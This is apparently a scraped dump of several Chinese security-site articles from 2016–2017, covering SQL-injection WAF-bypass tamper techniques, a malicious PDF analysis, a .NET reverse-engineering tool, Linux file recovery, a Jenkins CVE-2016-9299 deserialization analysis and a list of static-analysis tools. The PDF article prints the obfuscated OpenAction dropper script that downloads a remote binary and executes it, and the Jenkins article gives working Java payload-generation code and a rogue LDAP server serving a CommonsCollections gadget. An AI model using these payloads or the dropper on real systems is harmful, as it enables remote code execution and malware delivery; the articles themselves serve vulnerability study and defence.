用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符    space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符    space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符    space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符    space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符    space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符    space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符    space2plus.py 用加号“+”替换空格符    space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符    unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”    unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符    varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF    versionedkeywords.py 用MySQL注释包围每个非函数关键字    versionedmorekeywords.py 用MySQL注释包围每个关键字    xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF看起来很全，但有个缺点就是功能单一，灵活程度面对当今的主流waf来说很吃力了。鉴于多数waf产品是使用Rule进行防护，那么这里也不提什么高大上的机器学习。就是简单粗暴的fuzz。去年黄登提到过建立有毒标示模型，根据这个模型将waf进行训练。我把每个sql关键字两侧可插入的点称之为“位”，最基本的一句注入语句就有这些位：   假设有n个有毒标示    最基本的注入语句可以插入五个位    这五个位定义为a1,a2...a5    那么结果将会是多少呢？这个是叠加的，关键字不止这些，稍微复杂一点的环境就会需要更多的关键字来注入，也就会需要fuzz更多的位。还需要经过各种编码过后，根据数据库的样式使用相应的特性和配合的函数等等。当前几个关键字达到绕过效果时，只需继续fuzz后面几个位即可。还有就是传输过程中可测试的点：因为当我们在传输的过程中导致的绕过往往是致命的，比如中间件的特性/缺陷，导致waf不能识别或者是在满足特定条件下的欺骗了waf。0x07 End一写起来就根本停不起来，后期决定出一系列waf绕过文，例如文件上传、webshell防御、权限提升等Waf绕过。xss的bypass就算了，防不胜防…","2016-11-24 13:03:04","Web安全","我的WafBypass之道（SQL注入篇）","http://nsoad.com/Article/web/20161124/841.html"
"5ccbfada4f2f0a0a7a69c0d2","0&times;01 起因我们的网络监测设备在用户环境中发现了一个仅19KB的“成人影集”的PDF可疑文件，该文件免杀主流杀软但被我们监测设备判定为了高危，于是进行了进","Kong","0×01 起因我们的网络监测设备在用户环境中发现了一个仅19KB的“成人影集”的PDF可疑文件，该文件免杀主流杀软但被我们监测设备判定为了高危，于是进行了进一步的人工分析。（先承认马赛克是我打的，不为独享只因确实太污，作为老司机都有点消化不了）经调试分析，该PDF文件确实是一个恶意样本，PDF打开后会进一步从网络下载后续大马到本地并执行。0×02 恶意代码启动原理这个仅19KB的文件里还包含了图片，如果是利用漏洞来实现执行shellcode是很困难的，那究竟是通过什么手段呢？用UE打开文件：如上，文件中能找到/OpenAction，后面跟着一些像是脚本一样的代码。OpenAction从名字也能大概猜出意思，OpenAction是PDF文件中的一个object对象，放在Catalog Section下面，用来定义PDF文件被打开时候触发的事件。0×03 恶意脚本分析知道了启动原理，接下来重点就是分析后面的脚本，把脚本全部复制出来。(CMd.exe)/P(/q /c ""eC^hO new Function \('lsegso', 'var lsegso = lsegso.replace\(/bu/g, ""e""\).replace\(/gdys/g, ""r""\); eval\(lsegso\);'\)\('vagdys ywvumogdysgbugdys = ""MSXML2.XMLHTTP"";vagdys apagdysonk = ""Scgdysipting.FilbuSystbumObjbuct"";vagdys tysulabpbu = ""WScgdysipt.Shbull"";vagdys xzucih = ""ADODB.Stgdysbuam"";vagdys pakogt = nbuw ActivbuXObjbuct \(xzucih\);vagdys cbopyhoh = ""http://pop.nbxxxxxysls.gdysu/js/bxxx4.bin"";vagdys ikqutbux = nbuw ActivbuXObjbuct \(ywvumogdysgbugdys\);vagdys zlijmypmuth = nbuw ActivbuXObjbuct \(apagdysonk\);ikqutbux.opbun\(""GET"", cbopyhoh, 0\);pakogt.Opbun\(\);vagdys tmp_path = zlijmypmuth.GbutSpbucialFoldbugdys\( 2\) + ""\\\\\\\\"" + zlijmypmuth.GbutTbumpNambu\(\);pakogt.Typbu = 1;ikqutbux.sbund\(\);vagdys okbubbu = nbuw ActivbuXObjbuct \(tysulabpbu\);vagdys ycnozyhidb = ""cmd.buxbu /c "" + tmp_path;pakogt.Position = 0;if \(ikqutbux.Status == 200\) {pakogt.Wgdysitbu\(ikqutbux.RbusponsbuBody\);pakogt.SavbuToFilbu\(tmp_path\);pakogt.Closbu\(\);okbubbu.gdysun\(ycnozyhidb, 0\);zlijmypmuth.dbulbutbuFilbu\(WScgdysipt.ScgdysiptFullNambu\);}'\);&gt;ngAVe.Jse&amp;cS^cR^iPt^.eXE //^b   NgaVe.jSe""脚本经过了混淆处理，这样还看不出具体行为，但能发现里面CMd.exe，eval等一些关键字，就很像不怀好意。把作者用到的文本替换，大小写混用等混淆手段一一解开后，得到了如下脚本。解开混淆后的代码看着一下就舒服了，通过cmd.exe来解码脚本（/q /c参数执行命令，关闭回显），再通过cscript.exe来运行解码后的脚本（//b参数，静默执行，不显示脚本错误和提示信息），而脚本通过4个COM组件完成所有功能:MSXML2.XMLHTTP组件实现HTTP请求远端服务器的大马Scripting.FileSystemObject文件系统组件用于得到临时文件名字和路径，最后删除木马文件ADODB.Stream组件将HTTP请求到的数据也就是大马，保存成本地文件WScript.Shell组件用于执行下载下来的大马到此这个PDF恶意样本的行为就全部分析完了，远端服务器的俄罗斯域名目前已经取消了解析，还没能找到大马的样本，暂时不能再进一步分析，这背后是来自俄罗斯的攻击吗？0×04 样本背景分析虽然撰文此时，域名取消了解析，但这个域名最近频繁的修改过DNS，多次指向美国还有一次巴西。特意也隐藏了注册者信息，域名在今年年初注册了一年。这个域名的二级主域名以及其他三级子域名关联过更多的IP，IP地址有美国，印度，巴西，乌克兰，匈牙利等很多个国家这是否真是一次来自境外的攻击，甚至是APT？待找到大马后的进一步分析……","2016-11-03 14:40:32","系统安全","这个19KB的“成人影集”到底做了什么？","http://nsoad.com/Article/system/20161103/688.html"
"5ccbfada4f2f0a0a7a69c0d3","项目地址：https://github.com/0xd4d/dnSpydnSpy 是一款针对 .NET 程序的逆向工程工具。该项目包含了反编译器，调试器和汇编编辑器等功能组件，而且可以通过自己编写扩展插","Kong","项目地址：https://github.com/0xd4d/dnSpydnSpy 是一款针对 .NET 程序的逆向工程工具。该项目包含了反编译器，调试器和汇编编辑器等功能组件，而且可以通过自己编写扩展插件的形式轻松实现扩展。该项目使用 dnlib读取和写入程序集，以便处理有混淆代码的程序（比如恶意程序）而不会崩溃。已发布工具的下载地址：最新发布：https://github.com/0xd4d/dnSpy/releases或者通过源码构建该项目，参考 Wiki特性展示Edit any method, property or event in C# or Visual BasicEdit any type (class), method, property, event, fieldAdd, remove, rename any type (class), method, property, event, fieldEdit, add, remove .NET resources and save them to diskThe IL editor allows editing method bodies at the IL level: IL instructions, locals, exception handlersDebug any .NET assembly, no source code requiredRaw contents of locals (eg. decrypted byte arrays) can be saved to diskOptimizations for smaller screensMultiple tabs and tab groupsSearch assembliesAssembly analyzerHighlighted references, keywords, use Tab, Shift+Tab, Ctrl+Shift+Up, Ctrl+Shift+Down to select next or previous reference or Alt+Up/Down for next definitionStructure visualizer adds colorized vertical guide lines between braces; loops, try/catch and conditional blocks are shown in different colorsStructure visualizer is very useful when you're in a method like this:Go to: Entry Point, Module Initializer, MD Token, MD Table RowSyntax highlighted tooltips with XML doc comments when hovering over a type (class), method, property, event, fieldBackground images can be shown in the text editorSame image with left margin and top margin set to 75%Export to project decompiles all selected assemblies and creates a Visual Studio solutionCommand line decompiler, supports Windows, Linux, MacScripting with C# REPL, control the debugger and other extensions with C#Hex editorMetadata editor, click on a token or press Ctrl+Shift+D该项目的翻译相关如果你想要帮助翻译 dnSPY 成其它语言，请点击此处。Wiki具体命令和编译相关的内容请参考 Wiki 。Credits","2016-11-11 16:54:28","安全工具","dnSpy - 一款 .NET 程序逆向工具","http://nsoad.com/Security-tools/20161111/tools-749.html"
"5ccbfada4f2f0a0a7a69c0d4","写在前面的话在开始教程之前我有必要提醒大家，使用窗口管理器（GUI）删除文件和使用命令行工具（CLI）删除文件这两种方法之间是有区别的。当我们使用窗口管理器来删除文","kong","写在前面的话在开始教程之前我有必要提醒大家，使用窗口管理器（GUI）删除文件和使用命令行工具（CLI）删除文件这两种方法之间是有区别的。当我们使用窗口管理器来删除文件时，我们仅仅只是将文件从某个目录移动到了另一个目录中（回收站）。在这种情况下，唯一得到更新的就是你文件系统索引节点（inode）的元数据信息，例如被删除文件的时间戳、文件所占存储区块和扩展属性等数据。你可以使用tune2fs（调整和查看ext2/ext3文件系统的文件系统参数）来查看文件系统的索引节点信息，在命令行工具中输入下列指令：sudo tune2fs -l /dev/sda1 |grep -i inode运行之后，你将会得到类似下方所给出的示例信息：$ sudo tune2fs -l /dev/sda1 |grep -i inode Filesystem features: has_journal ext_attr resize_inode dir_index filetype needs_recoveryextent flex_bg sparse_super large_filehuge_file uninit_bg dir_nlinkextra_isizeInode count:             30007296Free inodes:             29382378Inodes per group:        8192Inode blocks per group:  512First inode:             11Inode size:              256Journal inode:           8First orphan inode:      21628027Journal backup:          inode blocks文件删除知多少当你使用SSH远程访问你的计算机时，你可以在目录“~/.local/share/Trash”中看到所有被删除的文件。这样一来，我们就可以直接使用GUI窗口来还原被删除的文件，非常的简单。但是，当你使用“rm”命令来删除某个文件时，这个文件可就不仅仅是被移动到一个隐藏目录那么简单了。这个时候，你需要通过更新索引节点元数据来通知操作系统，这份文件此前所占用的那部分磁盘空间已经可以继续使用了，操作系统现在可以直接将其他的文件写入这部分存储空间中。接下来，操作系统可能会在一个小时之后就覆盖这部分磁盘空间，但也有可能会在两个月之后才会使用这部分存储区域，具体将取决于操作系统以及文件系统的设置。当你在移除（安全删除）你的文件时，也就相当于你在让文件系统删除这份文件，然后再向这份文件此前所占用的那部分存储空间写入随机数据。对于“安全删除”的情况来说，我们通常是无法恢复被删除文件的。所以最好的方法就是当你意识到你误删了某一份文件时，就立刻开始进行文件恢复工作。你等的时间越久，成功恢复误删文件的可能性也就越低。如何恢复Linux平台下的误删文件？目前我们有很多种方法可以恢复Linux平台上的误删文件，其中主流的两个选项就是TestDisk/PhotoRec和extundelete。PhotoRec是TestDisk套件的其中一个组件，我们可以用它来恢复单独的文件。当然了，TestDisk的功能更加强大，它可以帮助我们恢复文件系统分区或磁盘启动扇区。TestDisk支持目前主流的文件系统，而且目前主流的操作系统平台都可以使用这款工具。在这篇文章中我们主要以PhotoRec为例来进行讲解。PhotoRec-【工具下载】PhotoRec 是一款用于恢复硬盘和光盘中丢失的视频、文档、压缩包等文件的数据恢复工具。除此之外，它还可以从数码相机的SD存储卡中恢复丢失的图片。因此，该软件被命名为PhotoRecovery这个名字。PhotoRec可以忽略文件系统的类型，并直接从介质底层恢复数据。因此，在介质的文件系统受到严重破坏或被重新格式化后，它同样能够进行数据恢复。PhotoRec是一款开源、跨多平台的免费数据恢复软件，受GNUGeneral Public License (GPLV v2+) 的保护。重要提示:一旦发现丢失或意外删除了某个图片、文件之后，请不要继续往该存储设备或磁盘写入新的文件，否则您可能会覆盖原来的数据。这意味着您在使用PhotoRec时，您千万不要将恢复的文件写入到原始数据所在的同一分区。PhotoRec支持的操作系统平台-DOS/Win9x-Windows NT 4/2000/XP/2003/Vista-Linux-FreeBSD, NetBSD, OpenBSD-Sun Solaris-Mac OS XPhotoRec支持的文件系统-FAT-NTFS-exFAT-ext2/ext3/ext4-HFS+一般情况下，PhotoRec的文件恢复过程如下图所示：extundelete-【工具下载】除了PhotoRec之外，我们也可以选择使用extundelete来完成数据恢复工作。extundelete针对的是ext3和ext4文件系统，所以相较于TestDisk而言，extundelete的使用范围就有一定的限制了。通常情况下，在进行文件恢复工作的时候，我们要先将文件系统重新挂载，然后给它分配只读权限。完成之后，再将恢复的文件写入另外一个文件系统中，这样可以避免原始数据所在的存储区域被覆盖。使用extundelete来恢复文件的操作步骤非常的简单，我们只需要选择相应的文件系统，然后运行下面这条命令即可：extundelete /dev/sda1 --restore-all总结数据恢复是一项非常复杂的工作，而且由于操作系统、文件系统以及人为因素的干扰，我们所恢复出来的文件很有可能会出现数据丢失的情况。所以当你发现你误删了文件时，请立刻停止使用你的电脑，并且尽快进行数据恢复工作，以免你的误删文件被其他的数据覆盖掉。","2016-11-16 14:00:04","系统安全","如何恢复Linux中的误删文件","http://nsoad.com/Article/system/20161116/785.html"
"5ccbfada4f2f0a0a7a69c0d5","这个漏洞在去年11月份官方发布通告的时候我当时关注过，当时自己一直在找com.sun.jndi.ldap.LdapAttribute这个类相关的反序列化，当时意识到这个类里面的_getAttributeSyntaxDefinition()_方....","iswin","这个漏洞在去年11月份官方发布通告的时候我当时关注过，当时自己一直在找com.sun.jndi.ldap.LdapAttribute这个类相关的反序列化，当时意识到这个类里面的_getAttributeSyntaxDefinition()_方法和_getAttributeDefinition()_可能会存在反序列化的问题，但是当时找了好多类，发现在反序列化的时候都无法触发这两个方法，原本以为是jdk里面自己的问题，最后就没继续跟下去了，中途有老外放出了一个ppt里面演示了这个漏洞，大概看了下发现是利用json来bypass Jenkins的白名单，当时一直在忙数据分析的事情，事情就搁浅了，前不久刚好MSF上有Payload了，再加上年底了没那么多事了，所以就研究了下，这个漏洞还是挺有意思的，涉及的知识面还是稍微广了一点，这里不得不佩服那些漏洞发现者。每当一个漏洞漏洞出现的时候，我就在想为什么自己不能发现，当每次漏洞分析完的时候才发现各方面的差距真的是不小。技术在于分享，这样才能进步。漏洞简介2016年11月16号Jenkins官方发布了一个安全通告，命名为CVE-2016-9299,从通告上来看，该漏洞依然是个反序列的漏洞，不过这个漏洞的反序列化和LDAP有关，而且在反序列化后需要连接到一个恶意的LDAP服务器，Jenkins对于之前反序列化的修复方法就是对一些恶意的类加上黑名单，所以这里首先得Bypass官方的黑名单，对于该漏洞只有这么多信息，而且在官方给的POC里面也仅仅是提到了com.sun.jndi.ldap.LdapAttribute这个类，这个漏洞的利用首先是不需要认证的，而且能任意代码执行，危害可见一斑。漏洞分析从官方的描述以及后面的Payload来看，问题和net.sf.json以及com.sun.jndi.ldap.LdapAttribute有关，通过分析对LdapAttribute这个类的分析，我们可以确定以下两个方法是触发反序列化漏洞的根本（关于下文中LDAP的反序列相关的知识请移步16年blackhat老外的Paper “us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE”）getAttributeSyntaxDefinitiongetAttributeDefinition这两个方法中都调用了该_DirContext schema = getBaseCtx().getSchema(rdn);_代码片段其中getBaseCtx()方法定义如下：该段代码使用jndi的方式去访问LDAP服务，这里我们可以控制Context.PROVIDER_URL的参数，从而控制jndi访问的LDAP服务器的地址。getSchema(rdn)方法最终会调用com.sun.jndi.ldap.LdapBindingEnumeration.createItem(String, Attributes, Vector)方法（调用关系太多，自己去调试），该方法的定义如下图在该方法中最终会调用Obj.decodeObject(attrs)方法，从而实现对象的反序列化。这里稍微提下，com.sun.jndi.ldap.Obj对象中定义了几种对象序列化与反序列化的方法，有直接反序列化的，也有直接通过远程加载的，这里的的反序列化稍微与其它地方的反序列化不同的点在于我们不能远程加载对象，因为com.sun.jndi.ldap.VersionHelper12.trustURLCodebase的默认值为false，所以直接决定了类加载器只能加载当前classpath下面的类，关于如何去构造对象使得LDAP在反序列化能执行任意代码，请看下文。到这里我们知道了com.sun.jndi.ldap.LdapAttribute中相关的方法能触发反序列化的漏洞，那么现在我们要做的就是去找到一个类在反序列化的时候能调用我们相应触发漏洞的函数，也就是在反序列化时能调用getAttributeSyntaxDefinition方法或者getAttributeDefinition方法的类，通过老外的PPT以及公开的gadgets，我们稍微分析下就会发现在net.sf.json这个类库中存在可以调用类任意getXXX函数的地方，那么com.sun.jndi.ldap.LdapAttribute这个类中的getXXX方法是不是也可以通过这种方式来调用，首先我们先确定究竟是那个类中的那个方法能调用getXXX函数，通过gadgets中的json Payload我们发现最终能调用对象的getXXX函数如下图（net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig)）所示上图中圈起来的两个地方就是能调用getXXX函数的地方，这里会先遍历javabean的所有属性，最后在挨个的调用。弄明白了能函数调用的根源，下一步就是去找这个函数究竟会怎样触发。通过eclipse我们可以很容易发现如下调用方式。如上图所示，我们可以看见defaultBeanProcessing方法最终会被ConcurrentSkipListSet类中的equals方法调用，到这里很多人可能会问了，那么多调用关系，你为什么就找这个类的equals方法，这里可能会有一些经验在里面，因为对于和equals方法相关的东西太多了，对于java中的某些数据结构，例如Set,每次添加元素的时候都会判断当前key是否存在，还有就是比较两个对象是否相等的时候会去调用hashcode和equals方法，这里如果了解过其它反序列化的同学对此可能会稍有感触，例如jdk的那个反序列化的触发过程。如果这种经验没有的话，那么你只能一个一个的去找了。最终我们找到了一个类可以的某个方法可以调用我们的函数了，但是你可能会发现在eclipse中这样的函数调用关系大多是多态情况下的方法调用，所以我们还需要对equals方法中的方法调用进行分析，这里我们需要注意的是defaultBeanProcessing这个函数的直接调用对象是net.sf.json.JSONArray.fromObject(Object, JsonConfig)方法，我们来看下equals方法在这个方法里面有两处调用了containsAll方法，我们要看看究竟是那个可能会调用fromObject，我们再来看下fromObject的调用关系，如下图你会发现JSONArray调用了containsAll方法，containsAll(c) &amp;&amp; c.containsAll(this);这里的第一个containsAll方法是触发不了的那个函数的，所以我们只要满足对象o是JSONArray就行了，但是事实上是不行了，因为这个对象o不是Set的子类，所以这条路到这基本上就走不通了，所以我们还得继续找。继续回到c.containsAll这个地方我们再找那些函数最终调用了containsAll，这里我们发现org.apache.commons.collections.collection.AbstractCollectionDecorator.containsAll(Collection)这个抽象类调用了，来看改函数的定义protected Collection collection;  .... public boolean containsAll(Collection coll) {     return collection.containsAll(coll); }这里最终会调用collection.containsAll方法，如果这里我们将collection赋值为JSONArray对象的话不照样触发漏洞么，由于AbstractCollectionDecorator这个类是抽象的，无法实例化，所以我们得找一个它的子类，注意这里我们必须得满足子类是实现了Set接口并且是可以序列化的，所以找到最后我们找到了org.apache.commons.collections.set.ListOrderedSet这个类。这里只需要满足父类的collection是JSONArray就行了。到这里我们知道了只需要让equals方法中的对象o赋值成org.apache.commons.collections.set.ListOrderedSet的实例就行了。接下来我们要去找关于equals的调用关系了，直接使用eclipse我们可以找到org.apache.commons.collections.map.Flat3Map.put(Object, Object)这个类（详细过程大家自己去跟），这个类有个更重要的一点是这个类在反序列化的时候恰好就触发了这个put函数，最终触发我们精心构造的对象。这个Flat3Map有个特点就是当map的元素小于等于3的时候会用类成员变量来存储数据，而且这里还必须得调用equals方法。悲剧的是这里我们需要构造两个对象也就是我们刚才讨论的，一个是ListOrderedSet一个是concurrentSkipListSet对象，但是这里我们需要满足这两个对象的key值的hashcode必须相同。 这里的hashcode要么全为0这样是最好的，也就是key为空字符串就行了，但是我们要构造的Payload里面必须要有JSONArray对象，这个对象默认的hashcode是29，不管怎么弄都不可能相等，不过这里我们可以用hashcode碰撞来解决hashcode值相同问题。这里我们关键的漏洞是怎么触发的已经浪费了大量的篇幅来说明，下来就是要去构造POC了，这里具体细节就比较简单了，不做过多的描述了。Payload-LDAP-JNDI这里直接给出生成Ldap序列化的Payload，如果谁有什么疑问可以邮件交流。@author iswinpublic static void main(String[] args) throws InstantiationException, IllegalAccessException,          IllegalArgumentException, InvocationTargetException, Exception {    Object o = Reflections.getFirstCtor(""com.sun.jndi.ldap.LdapAttribute"").newInstance(""iswin"");    Reflections.setFieldValue(o, ""baseCtxURL"", ""ldap://127.0.0.1:38900"");    ConcurrentSkipListSet sets = new ConcurrentSkipListSet(new NullComparator());    sets.add(o);    ListOrderedSet set = new ListOrderedSet();    JSONArray array = new JSONArray();    array.add(""\u0915\u0009\u001e\u000c\u0002\u0915\u0009\u001e\u000b\u0004"");    Reflections.setSuperFieldValue(set, set.getClass().getSuperclass().getSuperclass().getSuperclass(),            ""collection"", array);    Flat3Map map = new Flat3Map();    map.put(set, true);    map.put(sets, true);    //如果不在这里更改值，则满足不了hash相等条件，如果在之前设置为空，那么在Flat3Map的put方法时就会触发漏洞，则不能完成生成payload。    Reflections.setSuperFieldValue(o, o.getClass().getSuperclass(), ""attrID"", """");    byte[] bt = Serializer.serialize(map);    Deserializer.deserialize(bt);}Payload-LDAP-SERVER刚开始以为主要能生成序列化的Payload然后随便找个LDAP服务器弄个序列化的对象丢上去就行了，但是事实好像没有那么简单，我用apacheds模拟了好久就是不行，后来看了下上文提到的那个Obj.decodeObject(attrs)方法，发现这个必须要LDAP服务器返回的信息中必须包含某些属性，例如javaSerializedData，但是每次去请求总是达不到效果，后来去瞅了下msf上的payload，大概明白了一点，后来懒得去弄了，就学习了下ldap协议的rfc文档，熟悉了下asn1标记语言（有耐心的同学可以仔细看看），具体解释如下直接将msf上的那个模拟的服务端中的asn1部分直接拿java重写了下。 整体代码如下：@author iswinpublic class LdapServer {      public static byte[] hexStringToByteArray(String s) {        int len = s.length();        byte[] data = new byte[len / 2];        for (int i = 0; i &lt; len; i += 2) {            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) &lt;&lt; 4) + Character.digit(s.charAt(i + 1), 16));        }        return data;    }    public static String bytesToHex(byte[] bytes) {        char[] hexArray = ""0123456789ABCDEF"".toCharArray();        char[] hexChars = new char[bytes.length * 2];        for (int j = 0; j &lt; bytes.length; j++) {            int v = bytes[j] &amp; 0xFF;            hexChars[j * 2] = hexArray[v &gt;&gt;&gt; 4];            hexChars[j * 2 + 1] = hexArray[v &amp; 0x0F];        }        return new String(hexChars);    }    public static byte[] make_stage_reply() throws Exception {        Object payload = CommonsCollections1.class.newInstance().getObject(""open /Applications/Calculator.app"");        ByteArrayOutputStream objpayload = new ByteArrayOutputStream();        ObjectOutputStream oo = new ObjectOutputStream(objpayload);        oo.writeObject(payload);        Sequence sq = new Sequence();        sq.addElement(new OctetString(""javaClassName"".getBytes()));        Set s0 = new Set();        s0.addElement(new OctetString(""WTF"".getBytes()));        sq.addElement(s0);        Sequence sq1 = new Sequence();        sq1.addElement(new OctetString(""javaSerializedData"".getBytes()));        Set s = new Set();        s.addElement(new OctetString(objpayload.toByteArray()));        sq1.addElement(s);        Sequence sq2 = new Sequence();        sq2.addElement(sq);        sq2.addElement(sq1);        Sequence sq3 = new Sequence();        sq3.addElement(new OctetString(""cn=wtf, dc=example, dc=com"".getBytes()));        sq3.addElement(sq2);        sq3.setTagClass(Tag.APPLICATION);        sq3.setTagNumber(4);        Sequence sqall = new Sequence();        sqall.addElement(new ASN1Integer(3L));        sqall.addElement(sq3);        ByteArrayOutputStream opt = new ByteArrayOutputStream();        sqall.encode(new BerOutputStream(opt, BerOutputStream.ENCODING_DER));        return opt.toByteArray();    }    public static void read_ldap_packet(Socket socket) {        try {            InputStream sin = socket.getInputStream();            byte[] sinb = new byte[2];            sin.read(sinb);            if (sinb[0] != '0') {                return;            }            int length = (char) (sinb[1] &amp; 0xFF);            if ((length &amp; (1 &lt;&lt; 7)) != 0) {                int length_bytes_length = length ^ (1 &lt;&lt; 7);                byte[] length_bytes = new byte[length_bytes_length];                sin.read(length_bytes);                int sum = 0;                for (int i = 0; i &lt; length_bytes.length; i++) {                    sum += (length_bytes[i] &amp; 0xFF);                }                length = sum;            }            // System.out.println(""length"" + length);            byte[] tmp = new byte[length];            sin.read(tmp);        } catch (IOException e) {            e.printStackTrace();        }    }    public static void socketServer() throws Exception {        try {            ServerSocket server = new ServerSocket(38900);            Socket ss = server.accept();            OutputStream out = new BerOutputStream(ss.getOutputStream());            read_ldap_packet(ss);            out.write(hexStringToByteArray(""300c02010161070a010004000400""));            out.flush();            read_ldap_packet(ss);            out.write(hexStringToByteArray(                    ""3034020102642f04066f753d777466302530230411737562736368656d61537562656e747279310e040c636e3d737562736368656d61""));            out.write(hexStringToByteArray(""300c02010265070a010004000400""));            out.flush();            read_ldap_packet(ss);            out.write(make_stage_reply());            out.write(hexStringToByteArray(""300c02010365070a010004000400""));            out.flush();            out.close();            ss.close();            server.close();        } catch (IOException e) {            e.printStackTrace();        }    }    public static void main(String[] args) throws Exception {        socketServer();    }}最后再来简单说下那个Obj.decodeObject(attrs)的Payload构造问题，有的同学肯定会说了jndi不是直接可以远程加载类然后实例化么，这个问题再上门说过了，对于LDAP的jndi这个方法是行不通的，我们来看看这个Obj类到底是怎么处理的这里我们可以看到这里定义多种不同的方式来去解析对象， ClassLoader cl = helper.getURLClassLoader(codebases); 这个类加载器是从codebase的URL中去加载涉及的相关类，但是我看下具体方法所以默认是加载不了codebase中定义的类的，一旦这样我们就只能构造相关反序列化漏洞的POC，让类在Jenkins进行反序列化时再触发漏洞了，不过这样子的话Payload很有可能不成功。关于hashcode的碰撞问题这样叫不知道对不对，姑且这样叫吧，老外早就研究过这个问题，我直接把代码丢出来，可以碰撞出任意数值的hashcode值，大家在使用的时候要注意版权问题。package iswin;  public class HashCollision {      public static String convert(String str) {        str = (str == null ? """" : str);        String tmp;        StringBuffer sb = new StringBuffer(1000);        char c;        int i, j;        sb.setLength(0);        for (i = 0; i &lt; str.length(); i++) {            c = str.charAt(i);            sb.append(""\\u"");            j = (c &gt;&gt;&gt; 8); // 取出高8位            tmp = Integer.toHexString(j);            if (tmp.length() == 1)                sb.append(""0"");            sb.append(tmp);            j = (c &amp; 0xFF); // 取出低8位            tmp = Integer.toHexString(j);            if (tmp.length() == 1)                sb.append(""0"");            sb.append(tmp);        }        return (new String(sb));    }    public static String string2Unicode(String string) {        StringBuffer unicode = new StringBuffer();        for (int i = 0; i &lt; string.length(); i++) {            // 取出每一个字符            char c = string.charAt(i);            // 转换为unicode            unicode.append(""\\u"" + Integer.toHexString(c));        }        return unicode.toString();    }    /**     * Returns a string with a hash equal to the argument.     *      * @return string with a hash equal to the argument.     * @author - Joseph Darcy     */    public static String unhash(int target) {        StringBuilder answer = new StringBuilder();        if (target &lt; 0) {            // String with hash of Integer.MIN_VALUE, 0x80000000            answer.append(""\u0915\u0009\u001e\u000c\u0002"");            if (target == Integer.MIN_VALUE)                return answer.toString();            // Find target without sign bit set            target = target &amp; Integer.MAX_VALUE;        }        unhash0(answer, target);        return answer.toString();    }    /**     *      * @author - Joseph Darcy     */    private static void unhash0(StringBuilder partial, int target) {        int div = target / 31;        int rem = target % 31;        if (div &lt;= Character.MAX_VALUE) {            if (div != 0)                partial.append((char) div);            partial.append((char) rem);        } else {            unhash0(partial, div);            partial.append((char) rem);        }    }    public static void main(String[] args) {        System.out.println(convert(unhash(877174790)));        System.out.println(""\u0915\u0009\u001e\u000c\u0002\u5569\u001b\u0006\u001b"".hashCode());    }}补一张成功利用的截图总结只要方向对，撸起袖子加油干！参考[1] https://github.com/rapid7/metasploit-framework/pull/7815","2017-02-02 10:27:17","Web安全","Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析","http://nsoad.com/Article/web/20170202/1042.html"
"5ccbfada4f2f0a0a7a69c0d6","静态程序分析（Static program analysis）是指在不运行计算机程序的条件下，进行程序分析的方法。有些程序分析需要在程序运行时才能进行，这种程序分析称为动态程序分析。大","kong","静态程序分析（Static program analysis）是指在不运行计算机程序的条件下，进行程序分析的方法。有些程序分析需要在程序运行时才能进行，这种程序分析称为动态程序分析。大部分的静态程序分析的对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。静态程序分析一词多半是指配合静态程序分析工具进行的分析，人工进行的分析一般称为程序理解或代码审查。 — 维基百科这是一个静态分析工具大集合，其中[OSS]代表开源软件，[PROPRIETARY]代表付费软件，欢迎各位补充。C/C++CMetrics [OSS] – 测算C文件的大小及复杂性cqmetrics [OSS] – C代码的质量度量工具clang-tidy [OSS] – clang静态分析cppcheck [OSS] – C/C++代码静态分析flawfinder [OSS] – 寻找可能存在的安全漏洞flint++ [OSS] – 跨平台, 无依赖端口的flint, 由C++程序开发，Facebook也在用oclint [OSS] – C/C++代码静态分析splint [OSS] – C/C++代码静态分析tis-interpreter [OSS] – 由标准C写的一款用于寻找敏感bug的解释器vera++ [OSS] – Vera++是一个可用于验证，分析以及变换C++源代码的可编程工具CCode Analysis Rule Collection [OSS] – 包含一组特征, 代码修复以及在Microsoft .NET编译器平台”Roslyn”进行了重构code-cracker [OSS] – 一款适用于C#和VB的分析库，且使用Roslyn进行重构, 代码分析CSharpEssentials [OSS] – C# Essentials是一个Roslyn特征分析程序集合, 代码修复以及进行重构让其更能适应C# 6语言的特性Designite [PROPRIETARY] – Designite是一款设计质量评估工具，测算各种各样的代码质量度量以及趋势分析Gendarme[OSS] – Gendarme 检测包含在ECMA CIL 格式 (Mono and .NET)中的项目以及函数库，寻找出代码中会出现的一些常见问题（编译器一般不会检测的问题）.NET Analyzers [OSS] – 一个专注于开发分析器的组织(特征, 代码修复, 重构) ，使用.NET编译平台SonarLint for Visual Studio [OSS] – SonarLint是Visual Studio 2015中的一个扩展，其支持向开发者动态反馈新bug以及将质量问题注入.NET代码Refactoring Essentials [OSS] – Visual Studio 2015扩展用于C#以及VB.NET重构, 提供有关代码质量的建议ReSharper [PROPRIETARY] – 扩展Visual Studio支持动态代码检测C#, VB.NET, ASP.NET, JavaScript, TypeScript以及其他技术VSDiagnostics [OSS] – 一个基于Roslyn且集成了VS的静态分析器集合Wintellect.Analyzers [OSS] – Wintellect写的.NET编译平台(“Roslyn”) 特征分析器以及代码修复工具容器clair [OSS] – 用于容器的漏洞静态分析collector [OSS] – 容器内运行任意脚本,然后收集可用信息Haskell Dockerfile Linter [OSS] – 一款智能Dockerfile linter，可以帮助你构建Docker镜像最佳实践CSSCSS Stats [OSS] – 在样式表中潜在有趣的统计数据Parker [OSS] – 样式表分析工具scsslint [OSS] – SCSS文件小工具Specificity Graph [OSS] – CSS特征性图表生成器Stylelint – [OSS] – SCSS/CSS文件小工具Elixircredo [OSS] – 